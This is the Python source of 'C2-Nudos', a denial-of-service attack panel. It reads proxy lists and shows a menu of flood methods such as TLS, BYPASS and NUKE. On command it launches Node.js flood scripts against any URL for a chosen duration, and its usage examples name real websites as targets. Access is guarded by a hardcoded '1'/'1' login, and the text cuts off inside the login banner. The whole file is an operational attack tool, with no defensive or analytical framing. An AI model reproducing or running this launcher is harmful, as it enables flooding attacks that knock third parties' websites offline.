####################
#        C2-Nudos | 2023         #
#         DEVELOPER : Mika      #
####################  

import socket
import os
import requests
import random
import getpass
import time
import sys
import subprocess



				
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('http.txt').readlines()
bots = len(proxys)

proxys = open('proxy.txt').readlines()
bots = len(proxys)

def si():
    print('         \033[36m[ Nudos \033[36m] | \033[39m Welcome to Nudos! \033[36m| \033[39mOwner: Mika \033[36m| \033[39mUpdate V.5 ')
    print("")

def vip():
    clear()
    print('         \033[36m[ Nudos \033[36m] | \033[39m Welcome to Nudos! \033[36m| \033[39mOwner: Mika \033[36m| \033[39mUpdate V.5')
    print("")
    print(f'''
\033[39m                      ╔═╗╔═╗╔╦╗╔═╗   ╔╗╔╦ ╦╔╦╗╔═╗╔═╗
\033[36m                      ╚═╗╠═╣║║║╠═╝───║║║║ ║ ║║║ ║╚═╗
\033[39m                      ╚═╝╩ ╩╩ ╩╩     ╝╚╝╚═╝═╩╝╚═╝╚═╝V.5
\033[39m                               𝙼𝙴𝚃𝙷𝙾𝙳𝚂 𝙻𝙰𝚈𝙴𝚁7
 \033[36m               ╔═════════════╗╔═════════════╗╔═════════════╗
\033[36m                ║ \033[39m120 SEC MAX \033[36m║║\033[39m 120 SEC MAX \033[36m║║\033[39m 120 SEC MAX \033[36m║
\033[36m                ║═════════════║║═════════════║║═════════════║
\033[36m                ║\033[37m•HTTP-KANTOT\033[36m ║║\033[37m•TLS-DETECT\033[36m  ║║\033[37m•HTTPS       \033[36m║
\033[36m                ║\033[37m•HTTP-RAW\033[36m    ║║\033[37m•NUKE\033[36m        ║║\033[37m•HTTP-QUERY  \033[36m║
\033[36m                ║\033[37m•HTTP-REQ\033[36m    ║║\033[37m•HTTP1\033[36m       ║║\033[37m•BOT         \033[36m║
\033[36m                ║\033[37m•HTTPS-MIX\033[36m   ║║\033[37m•HTTP2\033[36m       ║║\033[37m•NOX         \033[36m║
\033[36m                ║\033[37m•HTTPS-POWER\033[36m ║║\033[37m•BYPASS     \033[36m ║║\033[37m•TLS         \033[36m║
\033[36m                ║\033[37m•TLS-VIP\033[36m     ║║\033[37m•404         \033[36m║║\033[37m•YOLO        \033[36m║
 \033[36m               ║             ║║             ║║             ║
\033[36m                ╚═════════════╝╚═════════════╝╚═════════════╝
                       \x1b[255;255;0m ===> NO SPAM ATTACK OKAY ? :)
\033[39m                          C2-Nudos DEVELOPER : Mika

                TYPE THE \033[36m[\033[32mMETHODS\033[36m] \033[36m[\033[32mURL\033[36m] \033[36m[\033[32mTIME\033[36m] TO START ATTACK
''')
    


def help():
    clear()
    print('        \033[36m[ Nudos \033[36m] | \033[39m Welcome to Nudos! \033[36m| \033[39mOwner: Mika \033[36m| \033[39mUpdate V.5')
    print("")
    print("""
\033[39m                              ╦ ╦╔═╗\033[37m╦  ╔═╗
\033[36m                              ╠═╣║╣ \033[37m║  ╠═╝
\033[39m                              ╩ ╩╚═╝\033[37m╩═╝╩
\033[36m             ╔══════════════╦════════════════════════════╗
\033[36m           ╔═╣   \033[39mCOMMANDS   \033[36m║         \033[39mDESCRIPTION        \033[36m╠═╗
\033[36m           ║\033[39mH\033[36m╠══════════════╬════════════════════════════╣\033[39mM\033[36m║
\033[36m           ║\033[39mE\033[36m║ \033[37mvip          \033[36m║ \033[37mShow Vip Methods           \033[36m║\033[39mE\033[36m║
\033[36m           ║\033[39mL\033[36m║ \033[37mraw          \033[36m║ \033[37mShow Raw Methods           \033[36m║\033[39mN\033[36m║
\033[36m           ║\033[39mP\033[36m║ \033[37maccount      \033[36m║\033[37m Account Infomation         \033[36m║\033[39mU\033[36m║
\033[36m           ╚═╣ \033[37mcls          \033[36m║ \033[37mBack To Main Page          \033[36m╠═╝
\033[36m             ╚══════════════╩════════════════════════════╝
""")

def menu():
    sys.stdout.write(f"         \x1b]2;NudosOnTop | Online 3 | CONNS 100 | USERS Nudosadmin\x07")
    clear()
    print('\033[36m [ Nudos \033[36m] | \033[39m Welcome to Nudos C2! \033[36m| \033[39mOwner: Mika \033[36m| \033[39mUpdate V.5')
    print("")
    print("""

____....
           a#####~:::::::,                   |
       a######P";:::::::::::,        .     --*--
    a########:::::::::::::::::,              |        .
   ########P::::::::::::*:::::::    .                         .
  ########P::::::::::::::::::.:::.
 ##### ##P:::::::::::::::::::::::;.               *
.#### O ##:::::*:::::::::::::::.::;.
###### #### ::::::::::::::::::.:::::
########@###,::::::::::::::::::::::;
#########~~~:::::::::::::::*:::.:::;    \ /            .        .
 ##### ##:::::::::::::::::::::::::;     / \     .
  ####a__ay::::::::::::::::::::::;
   ########;::::::::::::::::::::;      .               .
    ########a::::::::::::::::::'            .         .      *         .
      ########.:::::::::*;:::'             .                        . .
       `d######a.::::::::::'                                    .  .
          `~9#####.::::''           .               .            .
                             WELCOME TO Nudos-PANEL
	   	         TYPE \033[36m[\033[32mVIP\033[36m] TO SEE OUR METHODS
                        AUTHOR IN TELEGRAM : @mikamika27⠀⠀
""")





def p():
    menu()
    while(True):
        cnc = input("\033[0;30;46mMIKA@PANEL\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m")
        if cnc == "vip" or cnc == "Vip" or cnc == "VIP" or cnc == "viP":
            vip()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            p()
        elif cnc == "help" or cnc == "HELP" or cnc == "HEELP" or cnc == "HELPP":
            help()

                
#stop#
        elif "stop" in cnc:
            try:
                subprocess.run(['pkill screen'], shell=True)
                print(f" [!] Attack Stopped!")
            except IndexError:
                print('stop')
                

#VIP#

        elif "http-kantot" in cnc:
            try:
                url=cnc.split()[1]
                time=cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/http-kantot {url} {time} 5 512 '], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[39m                   TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
\033[39m                   METHOD   : [ HTTP-KANTOT ]
\033[39m                   FPS      : [ -1 UNLIMITED ]
\033[39m                   COOLDOWN : [ 0 ]
 \033[39m                  VIP      : [ \033[32mTrue\033[37m ]
   \033[39m                USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: http-kantot <target> <time>  ')
                print('Example: http-kantot http://xnxx.com 300 ')

        elif "https-mix" in cnc:
            try:
                url=cnc.split()[1]
                time=cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/https-mix {url} {time} 5 512 '], shell=True)
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[39m                   TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
\033[39m                   METHOD   : [ HTTPS-MIX ]
\033[39m                   FPS      : [ -1 UNLIMITED ]
\033[39m                   COOLDOWN : [ 0 ]
 \033[39m                  VIP      : [ \033[32mTrue\033[37m ]
   \033[39m                USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: https-mix <target> <time>  ')
                print('Example: https-mix http://xnxx.com 300 ')

        elif "http-req" in cnc:
            try:
                url=cnc.split()[1]
                time=cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/http-req {url} {time} 5 512 '], shell=True)
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[39m                   TARGET   : [ {url} ]
 \033[39m                  TIME     : [ {time} ]
\033[39m                   METHOD   : [ HTTP-REQ ]
\033[39m                   FPS      : [ -1 UNLIMITED ]
 \033[39m                  COOLDOWN : [ 0 ]
  \033[39m                 VIP      : [ \033[32mTrue\033[37m ]
 \033[39m                  USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: http-req <target> <time>  ')
                print('Example: http-req http://xnxx.com 300 ')

        elif "tls-detect" in cnc:
            try:
                url=cnc.split()[1]
                time=cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/TLS-DETECT.js {url} {time} 110 5 proxy.txt '], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[39m                   TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
 \033[39m                  METHOD   : [ TLS-DETECT ]
\033[39m                   FPS      : [ -1 UNLIMITED ]
 \033[39m                  COOLDOWN : [ 0 ]
\033[39m                   VIP      : [ \033[32mTrue\033[37m ]
 \033[39m                  USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: tls-detect [Target] [Time]  ')
                print('Example: tls-detect https://example.com/ 120 ')
                

        elif "http1" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system("cls" if os.name == "nt" else "clear")
                subprocess.run([f'screen -dm node ./core/http1 GET  {url} http.txt {time} 124 5 '], shell=True)
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
 \033[39m                  METHOD   : [ HTTP1 ]
\033[39m                   FPS      : [ -1 UNLIMITED ]
  \033[39m                 COOLDOWN : [ 0 ]
 \033[39m                  VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")
            except IndexError:
                print('Usage: http1 <host> <duration>  ')
                print('Example: http1 https://example.com/ 60 ')                

        elif "http2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/http2 GET  {url} http.txt {time} 124 5 '], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
 \033[39m                  METHOD   : [ HTTP2 ]
\033[39m                   FPS      : [ -1 UNLIMITED ]
\033[39m                   COOLDOWN : [ 0 ]
 \033[39m                  VIP      : [ \033[32mTrue\033[37m ]
 \033[39m                  USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: http2 <host> <duration>  ')
                print('Example: http2 https://example.com/ 60   ')
                
        elif "https-power" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/https-power GET  {url} http.txt {time} 124 5 '], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
\033[39m                   METHOD   : [ HTTPS-POWER ]
\033[39m                   FPS      : [ -1 UNLIMITED ]
\033[39m                   COOLDOWN : [ 0 ]
\033[39m                   VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: https-power <host> <duration>  ')
                print('Example: https-power https://example.com/ 60  ')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                method = cnc.split()[3]
                subprocess.run([f'screen -dm node ./core/http-raw {url} {time} {method}'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[39m                 TARGET   : [ {url} ]
 \033[39m                  TIME     : [ {time} ]
\033[39m                   METHOD   : [ HTTP-RAW ]
 \033[39m                  FPS      : [ -1 UNLIMITED ]
 \033[39m                  COOLDOWN : [ 0 ]
\033[39m                   VIP      : [ \033[32mTrue\033[37m ]
 \033[39m                  USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: http-raw <target> <time> <method> ')
                print('Example: http-raw http://xnxx.com 300 <GET/POST/HEAD>')
                
               
        elif "nuke" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/nuke {url} {time} 5 http.txt 124 '], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[39m                   TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
 \033[39m                  METHOD   : [ NUKE ]
 \033[39m                  FPS      : [ -1 UNLIMITED ]
 \033[39m                  COOLDOWN : [ 0 ]
 \033[39m                  VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: nuke https://xnxx.com/ 120 ')
                print('Example: nuke https://xnxx.com/ 120 ')
                
        elif "tls-vip" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/tls-vip {url} {time} 64 4 http.txt '], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[39m                   TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
 \033[39m                  METHOD   : [ TLS-VIP ]
 \033[39m                  FPS      : [ -1 UNLIMITED ]
 \033[39m                  COOLDOWN : [ 0 ]
 \033[39m                  VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: tls-vip <host> <duration>  ')
                print('Example: tls-vip https://example.com/ 60  ')

        elif "bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/bypass {url} {time} 4 proxy.txt 512 bypass '], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[39m                   TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
 \033[39m                  METHOD   : [ BYPASS ]
 \033[39m                  FPS      : [ -1 UNLIMITED ]
 \033[39m                  COOLDOWN : [ 0 ]
 \033[39m                  VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: bypass <host> <duration>  ')
                print('Example: bypass https://example.com/ 60   ')


               

                                         
        elif "http-query" in cnc:
            try:
                url=cnc.split()[1]
                time=cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/HTTP-QUERY.js {url} {time} 5 512 '], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[39m                   TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
\033[39m                   METHOD   : [ HTTP-QUERY ]
\033[39m                   FPS      : [ -1 UNLIMITED ]
\033[39m                   COOLDOWN : [ 0 ]
 \033[39m                  VIP      : [ \033[32mTrue\033[37m ]
   \033[39m                USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: http-query <target> <time>  ')
                print('Example: http-query http://xnxx.com 300 ')

        elif "404" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/404.js {url} {time} 260 4 proxy.txt '], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
 \033[39m                  METHOD   : [ 404 ]
\033[39m                   FPS      : [ -1 UNLIMITED ]
\033[39m                   COOLDOWN : [ 0 ]
 \033[39m                  VIP      : [ \033[32mTrue\033[37m ]
 \033[39m                  USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: 404 <host> <duration>  ')
                print('Example: 404 https://example.com/ 60  ')
    
        elif "bot" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/BOT.js {url} {time} 260 4 proxy.txt '], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
 \033[39m                  METHOD   : [ BOT ]
\033[39m                   FPS      : [ -1 UNLIMITED ]
\033[39m                   COOLDOWN : [ 0 ]
 \033[39m                  VIP      : [ \033[32mTrue\033[37m ]
 \033[39m                  USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: bot <host> <duration>  ')
                print('Example: bot https://example.com/ 60  ')
              
        elif "nox" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/NOX.js {url} {time} 65 5 proxy.txt '], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
 \033[39m                  METHOD   : [ NOX ]
\033[39m                   FPS      : [ -1 UNLIMITED ]
\033[39m                   COOLDOWN : [ 0 ]
 \033[39m                  VIP      : [ \033[32mTrue\033[37m ]
 \033[39m                  USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: nox <host> <duration>  ')
                print('Example: nox https://example.com/ 60  ')

        elif "tls" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/TLS.js {url} {time} 64 4 '], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
 \033[39m                  METHOD   : [ TLS ]
\033[39m                   FPS      : [ -1 UNLIMITED ]
\033[39m                   COOLDOWN : [ 0 ]
 \033[39m                  VIP      : [ \033[32mTrue\033[37m ]
 \033[39m                  USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: tls <host> <duration>  ')
                print('Example: tls https://example.com/ 60  ')
                
        elif "yolo" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/YOLO.js {url} {time} 124 4 proxy.txt '], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
 \033[39m                  METHOD   : [ YOLO ]
\033[39m                   FPS      : [ -1 UNLIMITED ]
\033[39m                   COOLDOWN : [ 0 ]
 \033[39m                  VIP      : [ \033[32mTrue\033[37m ]
 \033[39m                  USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: yolo <host> <duration>  ')
                print('Example: yolo https://example.com/ 60  ')
                
              
        elif "https" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/HTTPS.js {url} {time} 5 proxy.txt 64 75'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
 \033[39m                  METHOD   : [ HTTPS ]
\033[39m                   FPS      : [ -1 UNLIMITED ]
\033[39m                   COOLDOWN : [ 0 ]
 \033[39m                  VIP      : [ \033[32mTrue\033[37m ]
 \033[39m                  USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: https <host> <duration>  ')
                print('Example: https https://example.com/ 60  ')
                
              

       


        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass

#LOGIN
clear()
def login():
    user = "1"
    passwd = "1"
    print(f'''
\033[36m                         ⣇⣿⠘⣿⣿⣿⡿⡿⣟⣟⢟⢟⢝⠵⡝⣿⡿⢂⣼⣿⣷⣌⠩⡫⡻⣝⠹⢿⣿⣷
\033[36m                         ⡆⣿⣆⠱⣝⡵⣝⢅⠙⣿⢕⢕⢕⢕⢝⣥⢒⠅⣿⣿⣿⡿⣳⣌⠪⡪⣡⢑⢝⣇
\033[36m                         ⡆⣿⣿⣦⠹⣳⣳⣕⢅⠈⢗⢕⢕⢕⢕⢕⢈⢆⠟⠋⠉⠁⠉⠉⠁⠈⠼⢐⢕⢽
\033[36m                         ⡗⢰⣶⣶⣦⣝⢝⢕⢕⠅⡆⢕⢕⢕⢕⢕⣴⠏⣠⡶⠛⡉⡉⡛⢶⣦⡀⠐⣕⢕
